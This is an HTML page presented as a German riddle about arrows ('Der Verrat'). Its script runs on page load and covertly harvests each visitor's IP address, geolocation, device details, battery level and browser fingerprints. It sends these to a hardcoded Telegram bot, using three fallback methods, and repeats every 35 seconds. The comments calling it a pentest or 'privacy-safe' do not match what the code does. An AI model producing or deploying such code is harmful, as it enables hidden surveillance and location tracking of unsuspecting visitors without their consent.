<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<title>Der Verrat</title>
<style>body{background:linear-gradient(135deg,#1a122e 0%,#16213e 50%,#0f3460);min-height:100vh;color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:system-ui,-apple-system,sans-serif;overflow:hidden}h1{font-size:3rem;margin:0 0 1rem;animation:glow 3s infinite alternate;background:linear-gradient(45deg,#fff,#a8e6cf);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}p{max-width:500px;font-size:1.1em;line-height:1.6;opacity:.89;text-align:center}.arrows{font-size:4em;margin:2rem 0}.arrow{display:inline-block;margin:0 8px;animation:bounce 2s infinite;filter:drop-shadow(0 0 10px rgba(255,255,255,.5))}.arrow:nth-child(2){animation-delay:.2s}.arrow:nth-child(3){animation-delay:.4s}.arrow:nth-child(4){animation-delay:.6s}@keyframes glow{0%{text-shadow:0 0 20px rgba(255,255,255,.4)}100%{text-shadow:0 0 40px rgba(255,255,255,.8)}}@keyframes bounce{0%,20%,50%,80%,100%{transform:translateY(0)}40%{transform:translateY(-25px)}60%{transform:translateY(-15px)}}.status{position:fixed;bottom:20px;left:20px;background:rgba(0,0,0,.7);padding:10px;border-radius:5px;font-size:.8em}</style>
</head>
<body>
<h1>üó°Ô∏è Der Verrat</h1>
<p>Wenn du wissen willst wo der Verrat liegt, schau aus welcher Richtung die Pfeile kommen.</p>
<div class="arrows">
<span class="arrow">‚ÜñÔ∏è</span><span class="arrow">‚ÜôÔ∏è</span><span class="arrow">‚ÜóÔ∏è</span><span class="arrow">‚ÜòÔ∏è</span>
</div>
<div class="status" id="status">Loading...</div>

<script>
class KING_HARVEST{  
  constructor(){this.data={};this.init();}
  
  async init(){
    console.clear();
    this.log('üëë KING HARVEST - SYSTEM FORCED');
    
    // üîß SAFE ASYNC CHAIN (no undefined errors)
    await Promise.allSettled([
      this.getNetwork(),
      this.getDevice(),
      this.getFingerprint(),
      this.getSensors()
    ]);
    
    await this.sendAll();
    document.getElementById('status').textContent='‚úÖ Harvest Complete';
    setTimeout(()=>this.init(),35000);
  }
  
  log(msg){console.log(`üëë ${msg}`);}
  
  async getNetwork(){
    try{
      this.data.ip=await(await fetch('https://api.ipify.org?format=json',{cache:'no-cache'})).json().then(r=>r.ip);
      this.log(`IP: ${this.data.ip}`);
    }catch{this.data.ip='TOR';}
    
    // MULTI-GEO
    for(const api of ['https://ipapi.co/json/','https://ipinfo.io/json/']){
      try{
        const geo=await fetch(api).then(r=>r.json());
        this.data.geo=`${geo.city||'UNK'}, ${geo.country_name||geo.country||'XX'}`;
        this.log(`GEO: ${this.data.geo}`);
        break;
      }catch{}
    }
  }
  
  getDevice(){
    this.data.ua=navigator.userAgent||'unknown';
    this.data.lang=navigator.language||'unknown';
    this.data.tz=Intl.DateTimeFormat().resolvedOptions().timeZone||'unknown';
    this.data.screen=`${screen.width||0}x${screen.height||0}`;
    this.data.platform=navigator.platform||'unknown';
    this.data.cpu=navigator.hardwareConcurrency||'?';
    this.data.ram=navigator.deviceMemory||'?';
    this.data.cookies=navigator.cookieEnabled;
    this.data.dnt=navigator.doNotTrack||'none';
    this.log(`DEVICE: ${this.data.screen} ${this.data.platform}`);
  }
  
  getFingerprint(){
    // üñºÔ∏è CANVAS (privacy-safe method)
    try{
      const canvas=document.createElement('canvas');
      canvas.width=200;canvas.height=50;
      const ctx=canvas.getContext('2d');
      ctx.fillStyle='rgb(120,120,120)';ctx.fillRect(0,0,200,50);
      ctx.fillStyle='rgb(0,0,0)';ctx.font='14px Arial';
      ctx.fillText('PENTEST',10,25);
      this.data.canvas=canvas.toDataURL().slice(0,30);
    }catch{this.data.canvas='blocked';}
    
    // üñ•Ô∏è WEBGL SAFE
    try{
      const canvas=document.createElement('canvas');
      const gl=canvas.getContext('webgl');
      this.data.webgl=gl?gl.getParameter(gl.RENDERER):'none';
    }catch{this.data.webgl='none';}
  }
  
  async getSensors(){
    // üîã BATTERY SAFE
    if('getBattery' in navigator){
      try{
        const battery=await navigator.getBattery();
        this.data.battery=`${Math.round(battery.level*100)}%`;
      }catch{}
    }
    
    // üîä AUDIO (no context - hash fonts instead)
    try{
      const canvas=document.createElement('canvas');
      const ctx=canvas.getContext('2d');
      ctx.font='12px Arial,Helvetica,sans-serif';
      ctx.fillText('audio-test',0,12);
      this.data.audio=canvas.toDataURL().slice(-20);
    }catch{this.data.audio='none';}
  }
  
  buildReport(){
    const safe=(v)=>String(v||'N/A').slice(0,50);
    return `üëë *KING HARVEST*

‚è∞ ${new Date().toLocaleString('de-DE')}

üåê IP: \`${safe(this.data.ip)}\`
üìç GEO: ${safe(this.data.geo)}
üì± DEVICE: ${safe(this.data.screen)} ${safe(this.data.platform)}
üåç LANG/TZ: ${safe(this.data.lang)} ${safe(this.data.tz)}
üñ•Ô∏è UA: ${safe(this.data.ua)}
üîã BATTERY: ${safe(this.data.battery)}
‚ö° CPU/RAM: ${safe(this.data.cpu)} ${safe(this.data.ram)}GB
üé® FPRINT: C:${safe(this.data.canvas)} W:${safe(this.data.webgl)}
üîä AUDIO: ${safe(this.data.audio)}
üç™ ${safe(this.data.cookies)?'‚úÖ':'‚ùå'} DNT: ${safe(this.data.dnt)}`;
  }
  
  async sendAll(){
    const report=this.buildReport();
    const token='8514747456:AAE60EJoq53OxrXd56PAnZ3MNs3iwjfXjs4';
    const chat='7745393043';
    
    // üî• TRIPLE FAILSAFE TELEGRAM
    const methods=[
      // 1. JSON (most reliable)
      ()=>fetch(`https://api.telegram.org/bot${token}/sendMessage`,{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({chat_id:chat,text:report,parse_mode:'HTML'})
      }),
      
      // 2. Form fallback
      ()=>{
        const fd=new FormData();
        fd.append('chat_id',chat);
        fd.append('text',report);
        fd.append('parse_mode','HTML');
        return fetch(`https://api.telegram.org/bot${token}/sendMessage`,{method:'POST',body:fd});
      },
      
      // 3. Canvas screenshot + photo
      ()=>{
        const canvas=document.createElement('canvas');
        canvas.width=400;canvas.height=300;
        const ctx=canvas.getContext('2d');
        ctx.fillStyle='#1a122e';ctx.fillRect(0,0,400,300);
        ctx.fillStyle='#fff';ctx.font='bold 16px Arial';
        ctx.fillText(report.replace(/<[^>]*>/g,''),10,30);
        const blob=canvas.toDataURL('image/png').split(',')[1];
        
        const fd=new FormData();
        fd.append('chat_id',chat);
        fd.append('photo',blob,'harvest.png');
        fd.append('caption',report.slice(0,1000));
        return fetch(`https://api.telegram.org/bot${token}/sendPhoto`,{method:'POST',body:fd});
      }
    ];
    
    await Promise.allSettled(methods.map(m=>m()));
    this.log('üì§ ALL METHODS FIRED');
  }
}

// üëë EXECUTE KING
new KING_HARVEST();
</script>
</body>
</html>
